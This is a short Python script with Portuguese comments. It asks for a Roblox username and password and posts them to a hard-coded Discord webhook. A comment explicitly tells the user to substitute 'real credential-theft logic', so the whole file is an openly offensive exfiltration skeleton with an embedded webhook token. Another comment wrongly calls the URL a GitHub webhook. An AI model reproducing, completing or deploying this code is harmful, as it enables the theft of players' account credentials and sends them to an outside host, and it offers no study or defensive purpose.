import requests

# URL do webhook do GitHub (substitua com sua URL real)
URL_WEBHOOK = "https://discordapp.com/api/webhooks/1453524733734686866/QtSOE21NzYmL3F7qRpuiltXN8X8Dt4kDGUCyRrFeU1_OF_x81pG4IGx94-o6xXG0cgmm"

def enviar_mensagem_discord(mensagem):
    """Envia uma mensagem para o webhook do Discord."""
    payload = {
        "content": mensagem
    }
    try:
        resposta = requests.post(URL_WEBHOOK, json=payload)
        if resposta.status_code == 204:
            print("Mensagem enviada com sucesso!")
        else:
            print(f"Falha ao enviar mensagem: {resposta.status_code}")
    except Exception as e:
        print(f"Erro ao enviar mensagem: {e}")

if __name__ == "__main__":
    # Exemplo de uso - substitua com lógica real de roubo de credenciais
    usuario = input("Digite o nome de usuário: ")
    senha = input("Digite a senha: ")
    
    # Enviar credenciais para o webhook do Discord
    enviar_mensagem_discord(f"Credenciais da Conta Roblox:\nUsuário: {usuario}\nSenha: {senha}")
